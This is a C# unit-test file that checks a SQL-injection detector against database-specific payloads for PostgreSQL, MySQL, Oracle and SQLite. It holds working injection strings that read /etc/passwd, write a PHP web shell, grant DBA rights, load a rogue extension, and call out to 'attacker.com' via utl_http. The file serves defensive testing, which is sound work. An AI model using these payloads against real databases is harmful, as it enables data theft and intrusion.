using FluentAssertions;
using SqlInjectDetect;

namespace SqlInjectDetectTests;

[TestClass]
public sealed class SqlInjectDetectorDatabaseSpecificTests
{
    [TestMethod]
    public void ContainsSqlInjection_PostgreSQLSpecific_ReturnsTrue()
    {
        // Arrange - PostgreSQL specific injection patterns
        var postgreSQLInjections = new[]
        {
            // PostgreSQL string concatenation operator
            "'; SELECT version() || '",
            "admin' || (SELECT password FROM users WHERE id=1) || '",
            
            // PostgreSQL system functions
            "'; SELECT current_user(); --",
            "'; SELECT session_user(); --",
            "'; SELECT current_database(); --",
            "'; SELECT inet_server_addr(); --",
            "'; SELECT pg_backend_pid(); --",
            
            // PostgreSQL specific tables and views
            "'; SELECT * FROM pg_user; --",
            "'; SELECT * FROM pg_shadow; --",
            "'; SELECT * FROM pg_group; --",
            "'; SELECT * FROM pg_tables; --",
            "'; SELECT * FROM information_schema.tables; --",
            
            // PostgreSQL large objects
            "'; SELECT lo_import('/etc/passwd'); --",
            "'; SELECT lo_export(lo_import('/etc/passwd'), '/tmp/passwd'); --",
            
            // PostgreSQL copy command
            "'; COPY users TO '/tmp/users.txt'; --",
            "'; COPY (SELECT * FROM users) TO '/tmp/dump.txt'; --",
            
            // PostgreSQL custom functions
            "'; CREATE FUNCTION evil() RETURNS void AS 'rm -rf /' LANGUAGE 'C'; --",
            
            // PostgreSQL regex operations
            "admin' AND 'password' ~ '^[a-z]' --",
            "'; SELECT * FROM users WHERE username ~* 'admin'; --",
            
            // PostgreSQL array operations
            "'; SELECT unnest(ARRAY['admin', 'root']); --",
            
            // PostgreSQL procedural languages
            "'; CREATE LANGUAGE plpythonu; --",
            "'; SELECT version() FROM generate_series(1,1000); --"
        };

        // Act & Assert
        foreach (var injection in postgreSQLInjections)
        {
            SqlInjectDetector.ContainsSqlInjection(injection).Should().BeTrue(
                $"PostgreSQL injection '{injection}' should be detected");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_MySQLSpecific_ReturnsTrue()
    {
        // Arrange - MySQL specific injection patterns
        var mySQLInjections = new[]
        {
            // MySQL information gathering
            "'; SELECT @@version; --",
            "'; SELECT @@datadir; --",
            "'; SELECT @@basedir; --",
            "'; SELECT @@hostname; --",
            "'; SELECT @@tmpdir; --",
            "'; SELECT CONNECTION_ID(); --",
            
            // MySQL system schemas
            "'; SELECT * FROM mysql.user; --",
            "'; SELECT * FROM mysql.db; --",
            "'; SELECT schema_name FROM information_schema.schemata; --",
            "'; SELECT table_name FROM information_schema.tables; --",
            
            // MySQL file operations
            "'; SELECT load_file('/etc/passwd'); --",
            "'; SELECT 'data' INTO OUTFILE '/tmp/mysql.txt'; --",
            "'; SELECT 'shell' INTO DUMPFILE '/var/www/shell.php'; --",
            
            // MySQL specific functions
            "'; SELECT benchmark(5000000, md5('test')); --",
            "'; SELECT sleep(5); --",
            "'; SELECT get_lock('mysql', 1); --",
            
            // MySQL conditional comments
            "/*! SELECT version() */",
            "`/*!50001 SELECT version() */`",
            "/*! UNION SELECT 1,2,3 */",
            
            // MySQL hex and binary
            "admin' OR username=0x61646d696e; --",
            "'; SELECT unhex('414243'); --",
            "'; SELECT binary('test'); --",
            
            // MySQL string functions
            "'; SELECT concat(user(), ':', password) FROM mysql.user; --",
            "'; SELECT group_concat(table_name) FROM information_schema.tables; --",
            
            // MySQL error-based injection
            "' AND extractvalue(1, concat(0x7e, version(), 0x7e)); --",
            "' AND updatexml(1, concat(0x7e, user(), 0x7e), 1); --"
        };

        // Act & Assert
        foreach (var injection in mySQLInjections)
        {
            SqlInjectDetector.ContainsSqlInjection(injection).Should().BeTrue(
                $"MySQL injection '{injection}' should be detected");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_OracleSpecific_ReturnsTrue()
    {
        // Arrange - Oracle specific injection patterns
        var oracleInjections = new[]
        {
            // Oracle dual table
            "'; SELECT banner FROM v$version; --",
            "'; SELECT user FROM dual; --",
            "'; SELECT sysdate FROM dual; --",
            
            // Oracle system views
            "'; SELECT * FROM all_tables; --",
            "'; SELECT * FROM user_tables; --",
            "'; SELECT * FROM all_tab_columns; --",
            "'; SELECT * FROM v$database; --",
            "'; SELECT * FROM v$instance; --",
            
            // Oracle specific functions
            "'; SELECT dbms_xmlgen.getxml('SELECT user FROM dual') FROM dual; --",
            "'; SELECT extractvalue(xmltype('<?xml version=\"1.0\"?><test>data</test>'), '/test') FROM dual; --",
            
            // Oracle PL/SQL
            "'; BEGIN dbms_output.put_line('test'); END; --",
            "'; DECLARE x VARCHAR2(100); BEGIN x := 'test'; END; --",
            
            // Oracle UTL packages
            "'; SELECT utl_inaddr.get_host_address FROM dual; --",
            "'; SELECT utl_http.request('http://attacker.com') FROM dual; --",
            
            // Oracle error-based
            "' AND 1=ctxsys.drithsx.sn(user, 'ORACLE') --",
            "' AND 1=XMLType('<?xml version=\"1.0\"?><test>' || user || '</test>') --",
            
            // Oracle time-based
            "'; SELECT count(*) FROM all_objects; --",
            "' AND 1=(SELECT count(*) FROM all_objects WHERE rownum <= 1000000) --",
            
            // Oracle privilege escalation
            "'; GRANT DBA TO username; --",
            "'; CREATE PUBLIC SYNONYM evil FOR sys.dual; --"
        };

        // Act & Assert
        foreach (var injection in oracleInjections)
        {
            SqlInjectDetector.ContainsSqlInjection(injection).Should().BeTrue(
                $"Oracle injection '{injection}' should be detected");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_SQLiteSpecific_ReturnsTrue()
    {
        // Arrange - SQLite specific injection patterns
        var sqliteInjections = new[]
        {
            // SQLite system tables
            "'; SELECT * FROM sqlite_master; --",
            "'; SELECT sql FROM sqlite_master WHERE type='table'; --",
            "'; SELECT name FROM pragma_table_info('users'); --",
            
            // SQLite pragmas
            "'; PRAGMA database_list; --",
            "'; PRAGMA table_info(users); --",
            "'; PRAGMA foreign_key_list(users); --",
            "'; PRAGMA schema_version; --",
            
            // SQLite file operations
            "'; ATTACH DATABASE '/tmp/evil.db' AS evil; --",
            "'; ATTACH DATABASE 'data.db' AS external; --",
            
            // SQLite functions
            "'; SELECT sqlite_version(); --",
            "'; SELECT randomblob(1000000); --",
            "'; SELECT load_extension('evil.so'); --",
            
            // SQLite specific syntax
            "'; CREATE TEMP TABLE evil AS SELECT * FROM users; --",
            "'; INSERT OR REPLACE INTO users VALUES ('admin', 'hacked'); --",
            "'; UPDATE OR IGNORE users SET password='hacked'; --"
        };

        // Act & Assert
        foreach (var injection in sqliteInjections)
        {
            SqlInjectDetector.ContainsSqlInjection(injection).Should().BeTrue(
                $"SQLite injection '{injection}' should be detected");
        }
    }
}